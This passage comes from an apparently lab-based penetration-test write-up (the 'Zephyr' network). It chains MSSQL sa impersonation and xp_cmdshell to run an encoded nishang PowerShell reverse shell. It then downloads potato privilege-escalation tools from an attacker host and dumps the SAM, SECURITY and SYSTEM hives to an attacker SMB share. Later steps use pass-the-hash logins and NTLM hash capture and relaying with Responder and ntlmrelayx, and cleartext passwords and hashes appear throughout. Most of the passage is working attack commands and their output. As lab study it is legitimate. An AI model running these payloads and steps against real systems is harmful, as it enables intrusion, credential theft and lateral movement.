 1   b'ZABBIX.ZSM.LOCAL'                  b'192.168.210.13'   b'ZEPHYR'            

 2   b'ZPH-SVRDC01.ZSM.LOCAL'             b'192.168.210.10'   b'ZEPHYR'            

 3   b'ZPH-SVRADFS1.ZSM.LOCAL'            b'192.168.210.14'   b'ZEPHYR'            

 4   b'ZPH-SVRCA01.ZSM.LOCAL'             b'192.168.210.12'   b'ZEPHYR'            

 5   b'ZPH-SVRSQL01.ZSM.LOCAL'            b'192.168.210.15'   b'ZEPHYR'            

 6   b'ZPH-SVRCDC01.INTERNAL.ZSM.LOCAL'   b'192.168.210.16'   b'INTERNAL.ZEPHYR'   

 7   b'ZPH-SVRCHR..INTERNAL.ZSM.LOCAL'    b'192.168.210.17'   b'INTERNAL.ZEPHYR'   

 8   b'ZPH-SVRCSUP.INTERNAL.ZSM.LOCAL'    b'192.168.210.18'   b'INTERNAL.ZEPHYR'   

 9   b'DC.PAINTERS.HTB'                   b'192.168.110.55'   b'PAINTERS'

```

Let’s also see who we can impersonate:

```bash
SQL (zabbix  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        zabbix    sa 
```

We can impersonate the sa, this would give us execution privileges. Let’s login as sa and enable command exection:

```bash
exec_as_login sa

enable_xp_cmdshell

INFO(ZPH-SVRSQL01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ZPH-SVRSQL01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

```

Let’s check who we are and our privileges:

```bash
SQL (sa  dbo@master)> xp_cmdshell whoami

output                   
----------------------   
nt service\mssqlserver 

SQL (sa  dbo@master)> xp_cmdshell whoami /priv

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL  
```

We have SeImpersonate Privilege. Let’s get a shell back. 

We can guess the firewall is probably only allows ports like 80, 443 out. We know port 80 on Zabbix server is unused. Let’s forward the listener from port 80 on Zabbix server back to our local host. Since it’s port 80, we need root permission on Zabbix server.

```bash
#on proxy session
session
listener_add --addr 0.0.0.0:80 --to 0.0.0.0:4444
```

Now we encode our powershell reverse shell from nishang; change the port first, then encode in b64:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2060.png)

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIAMQAwAC4AMQAzACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
```

Now let’s execute:

```bash
#to test whoami:
xp_cmdshell "powershell -enc dwBoAG8AYQBtAGkACgA="

#now reverse shell
xp_cmdshell "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIAMQAwAC4AMQAzACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA=="

```

We now have shell:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2061.png)

Checking systeminfo to get the release date of the OS:

```bash
systeminfo

OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

October 2, 2018. Let’s try printspoofer.

[https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases)

Let’s download it and upload it to target:

```bash
wget http://10.10.16.5:443/PrintSpoofer64.exe -O psp.exe
```

Let’s also upload a batch script, using the same nishang reverse shell we used before, with powershell encoded command:

run.bat:

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIAMQAwAC4AMQAzACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
```

Now upload and execute:

```bash
wget http://10.10.16.5:443/run.bat -O run.bat

.\psp.exe -c "C:\programdata\run.bat"
```

Did not work.

Let’s try [https://github.com/antonioCoco/JuicyPotatoNG/releases](https://github.com/antonioCoco/JuicyPotatoNG/releases) 

```bash
wget http://10.10.16.5:443/JuicyPotatoNG.exe -O jp.exe
```

Now let’s run:

```bash
.\jp.exe -t * -p C:\programdata\run.bat
```

Did not work either. 

Let’s try godpotato:

[https://github.com/BeichenDream/GodPotato/releases](https://github.com/BeichenDream/GodPotato/releases)

```bash
wget http://10.10.16.5:443/GodPotato-NET4.exe -O gp.exe

.\gp.exe -cmd "cmd /c C:\programdata\run.bat"
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2062.png)

Now we can dump SAM and LSA:

```bash
C:\WINDOWS\system32> reg.exe save hklm\sam C:\programdata\sam

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\programdata\system

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\programdata\security

The operation completed successfully.
```

Now let’s transfer:

```bash
#On attack box:
sudo impacket-smbserver share -smb2support . -user test -password test
#Now to transfer the files from Windows

net use Z: \\10.10.16.5\share /user:test test
C:\> move sam \\10.10.16.5\share\
        1 file(s) moved.

C:\> move security \\10.10.16.5\share
        1 file(s) moved.

C:\> move system \\10.10.16.5\share
        1 file(s) moved.
```

Now let’s view it:

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL

<SNIP>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ac325190bb999ef4ad73b0b67e8e33c:::
```

Nothing important except for Administrator NTLM hash.

Let’s evil-winrm to the machine:

```bash
evil-winrm -u Administrator -H 7ac325190bb999ef4ad73b0b67e8e33c -i 192.168.210.15
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2063.png)

We can get the flag now.

We go back to the MSSQL server.

Now check again for linked servers:

```bash
impacket-mssqlclient zabbix@192.168.210.15 #rDhHbBEfh35sMbkY
```

```bash
exec_as_login sa

enum_links

SRV_NAME        SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-------------   ----------------   -----------   --------------   ------------------   ------------   -------   
ZPH-SVRSQL01    SQLNCLI            SQL Server    ZPH-SVRSQL01     NULL                 NULL           NULL      

ZSM-SVRCSQL02   SQLNCLI            SQL Server    ZSM-SVRCSQL02    NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
ZPH-SVRSQL01    NULL                        1   NULL           

ZSM-SVRCSQL02   sa                          0   sa  
```

Let’s use the linked server:

```bash
use_link [ZSM-SVRCSQL02]

SQL >[ZSM-SVRCSQL02] (sa  dbo@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

sites                    0  
```

Let’s look in sites:

```bash
#Selecting a DB
USE sites

#Show tables
SELECT table_name FROM [ZSM-SVRCSQL02].sites.INFORMATION_SCHEMA.TABLES
table_name   
----------   
sites 

#Select all Data from Table "sites"
SELECT * FROM [ZSM-SVRCSQL02].sites.dbo.sites

id   site_name                         status       reason
--   -------------------------------   ----------   -----------------------------------------------------
 1   b'https://zephyr.bamboohr.htb'    b'Offline'   b'Migrating to Cloud, server cleared in preparation.'

 2   b'https://zephyr.atlassian.htb'   b'Offline'   b'Migrating to Cloud, server cleared in preparation.'

SQL >[ZSM-SVRCSQL02] (sa  dbo@master)> SELECT name,password_hash FROM [ZSM-SVRCSQL02].master.sys.sql_logins
name                                                                                                                                                                  password_hash
---------------------------------   -----------------------------------------------------------------------------------------------------------------------------------------------
sa                                  b'020098f6313e34af5c5502e837234613e591aec413b7921ec66a341758a05ef38e73b35a59a5cf41337ab08ecf89f2d5bb8ecf29dc9b3ce5b70f6ffc67f7310b0368ff5c8f5a'

##MS_PolicyEventProcessingLogin##   b'0200e37ee84660585986b05f9c36b6bb23481e41505ee41d1ea386491a9a759d8be8dd592f29c3f2ed086e9fc2eba1ef3b5c74b1226275eb15613e2ca75b484ec30112fb5df5'

##MS_PolicyTsqlExecutionLogin##     b'020009ffdc8861b58d0d8d5b80c4c93fee20c9b6c27cef232829affe08eb42ab202eaeeacc35aa54220b1310f3aad231e0ea8b68c5c2a6e8b2520fde8989653743c2831b1bc2'

```

Not much information on the db. Let’s get a shell back. 

```bash
enable_xp_cmdshell

INFO(ZSM-SVRCSQL02): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(ZSM-SVRCSQL02): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Now start a listener (ligolo tunnel port 80 to [localhost](http://localhost) 4444, same as above), and execute:

```bash
xp_cmdshell "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIAMQAwAC4AMQAzACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA=="
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2064.png)

We continue this exploitation on SVRCSQL02.

## 192.168.210.19  ZSM-SVRCSQL02

```bash
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   192.168.210.19:1433:
|     Target_Name: internal
|     NetBIOS_Domain_Name: internal
|     NetBIOS_Computer_Name: ZSM-SVRCSQL02
|     DNS_Domain_Name: internal.zsm.local
|     DNS_Computer_Name: ZSM-SVRCSQL02.internal.zsm.local
|     DNS_Tree_Name: zsm.local
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-18T07:30:13
|_Not valid after:  2055-11-18T07:30:13
|_ssl-date: 2025-11-18T11:57:31+00:00; +3s from scanner time.
| ms-sql-info:
|   192.168.210.19:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds

```

From the scan, we see the domain name is different, it must be an internal network. Let’s add that to our /etc/hosts and map out the internal domain with rusthound:

```bash
192.168.210.19 internal.zsm.local ZSM-SVRCSQL02.internal.zsm.local
```

Try melissa:

```bash
nxc winrm 192.168.210.19 -u melissa -p 'WinterIsHere2022!'

#Denied
```

Rusthound:

```bash
rusthound-ce -u marcus -p '!QAZ2wsx' -d internal.zsm.local
```

```bash
nxc smb 192.168.210.19 -u marcus -p '!QAZ2wsx'
```

Let’s login to mssql:

```bash
impacket-mssqlclient melissa@192.168.210.19 -windows-auth

#WinterIsHere2022!
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2065.png)

```bash
SELECT name FROM master.dbo.sysdatabases

#Selecting a DB
USE sites

ERROR(ZSM-SVRCSQL02): Line 1: The server principal "internal\Melissa" is not able to access the database "sites" under the current security context.

```

Let’s see if we can impersonate any users:

```bash
SQL (internal\Melissa  guest@master)> enum_impersonate

execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------  
```

Nope.

```bash
SQL (internal\Melissa  guest@master)> enum_owner
Database   Owner   
--------   -----   
master     sa      

tempdb     sa      

model      sa      

msdb       sa      

sites      sa 
```

Every db is owned by sa.

Let’s see if we can capture any hashes:

```bash
sudo responder -I tun0
```

Now let’s imitate a connection:

```bash
EXEC master..xp_dirtree '\\10.10.16.5\share\'
```

On our responder:

```bash
[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : internal\mssql_svc
[SMB] NTLMv2-SSP Hash     : mssql_svc::internal:bd417099b4d82308:8E35C007E2EA1F6E3ADB98AAA925EB47:01010000000000008002DBCE5B58DC012611C788CEA97BE40000000002000800460041004200350001001E00570049004E002D00580046004C004200440035003600540038003400320004003400570049004E002D00580046004C00420044003500360054003800340032002E0046004100420035002E004C004F00430041004C000300140046004100420035002E004C004F00430041004C000500140046004100420035002E004C004F00430041004C00070008008002DBCE5B58DC0106000400020000000800300030000000000000000000000000300000B8E735F111B2EC49F41D18D2E2C201CF8A7E53722D732D14B92DD905C3A8D6590A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000

```

Let’s crack with hashcat:

```bash
.\hashcat.exe -m 5600 ..\hashes.txt ..\rockyou.txt

.\hashcat.exe -m 5600 ..\hashes.txt ..\shared\pwds.txt -r rules\best66.rule
```

No result. 

```bash
impacket-mssqlclient zabbix@192.168.210.19
```

Does not work.

Let’s see if sa uses the same password as Melissa:

```bash
impacket-mssqlclient sa@192.168.210.19 -windows-auth

#passwords tried
WinterIsHere2022!
sa
password
WinterIsHere2025!
```

Let’s relay:

```bash
#on localhost
impacket-ntlmrelayx -t mssql://192.168.210.19:1433 -smb2support -i

#on mssql session
EXEC master..xp_dirtree '\\10.10.16.5\share\'
```

Let’s try to sign in smb:

```bash
impacket-ntlmrelayx -t 192.168.210.15 -smb2support --no-http -i
#not work

impacket-ntlmrelayx -t smb://192.168.210.15/C$ -smb2support --no-http -i

#now connect
nc localhost 11000
use C$
use Admin$

#on the relay terminal
SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

```

See what other we can relay to:

```bash
impacket-ntlmrelayx -tf relay.txt -smb2support --no-http 

*] Servers started, waiting for connections
[*] Received connection from internal/mssql_svc at ZSM-SVRCSQL02, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INTERNAL/MSSQL_SVC@10.10.110.35 controlled, attacking target smb://192.168.210.15
[*] Authenticating against smb://192.168.210.15 as INTERNAL/MSSQL_SVC SUCCEED
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INTERNAL/MSSQL_SVC@10.10.110.35 controlled, attacking target smb://192.168.210.11
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Authenticating against smb://192.168.210.11 as INTERNAL/MSSQL_SVC SUCCEED
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INTERNAL/MSSQL_SVC@10.10.110.35 controlled, attacking target smb://192.168.210.12
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Authenticating against smb://192.168.210.12 as INTERNAL/MSSQL_SVC SUCCEED
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from INTERNAL/MSSQL_SVC@10.10.110.35 controlled, attacking target smb://192.168.210.14
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Authenticating against smb://192.168.210.14 as INTERNAL/MSSQL_SVC SUCCEED
[*] All targets processed!
[*] SMBD-Thread-4 (process_request_thread): Connection from INTERNAL/MSSQL_SVC@10.10.110.35 controlled, but there are no more targets left!
[*] Received connection from unknown at ZSM-SVRCSQL02, connection will be relayed after re-authentication
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Received connection from unknown at ZSM-SVRCSQL02, connection will be relayed after re-authentication
```

****

From exploiting SQL01, we got a reverse shell onto the host:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2064.png)

It has SeImpersonatePrivilege. Let’s use Godpotato and upload it

[https://github.com/BeichenDream/GodPotato/releases](https://github.com/BeichenDream/GodPotato/releases)

```bash
wget http://10.10.16.5:443/GodPotato-NET4.exe -O gp.exe

```

Let’s also upload a batch script, using the same nishang reverse shell we used before, with powershell encoded command:

run.bat:

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIAMQAwAC4AMQAzACcALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==
```

Now upload and execute:

```bash
wget http://10.10.16.5:443/run.bat -O run.bat

.\gp.exe -cmd "cmd /c C:\programdata\run.bat"
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2066.png)

We now have SYSTEM shell.

Now we can dump SAM and LSA:

```bash
C:\WINDOWS\system32> reg.exe save hklm\sam C:\programdata\sam

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\programdata\system

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\programdata\security

The operation completed successfully.
```

Now let’s transfer:

```bash
#On attack box:
sudo impacket-smbserver share -smb2support . -user test -password test
#Now to transfer the files from Windows

net use Z: \\10.10.16.5\share /user:test test

C:\> move sam \\10.10.16.5\share\
        1 file(s) moved.

C:\> move security \\10.10.16.5\share
        1 file(s) moved.

C:\> move system \\10.10.16.5\share
        1 file(s) moved.
```

Now let’s view it:

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL

#Important outputs:
<SNIP>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c:::

[*] _SC_MSSQLSERVER 
(Unknown User):ToughPasswordToCrack123!
[*] Cleaning up... 
                 
```

Let’s now login as Administrator:

```bash
evil-winrm -u Administrator -H 5dc71607c06cf83eea0f3d789bce419c -i 192.168.210.19
```

Let’s see if the password is mssql_svc’s

```bash
nxc mssql 192.168.210.19 -u mssql_svc -p 'ToughPasswordToCrack123!'

MSSQL       192.168.210.19  1433   ZSM-SVRCSQL02    [+] internal.zsm.local\mssql_svc:ToughPasswordToCrack123!
```

It is. 

Now that we are on the internal domain, let’s upload SharpHound, execute it to map out the AD.

```bash
upload SharpHound.exe

.\SharpHound.exe all

2025-11-19T10:20:55.4557765+00:00|ERROR|Unable to connect to LDAP: All attempted connections failed

```

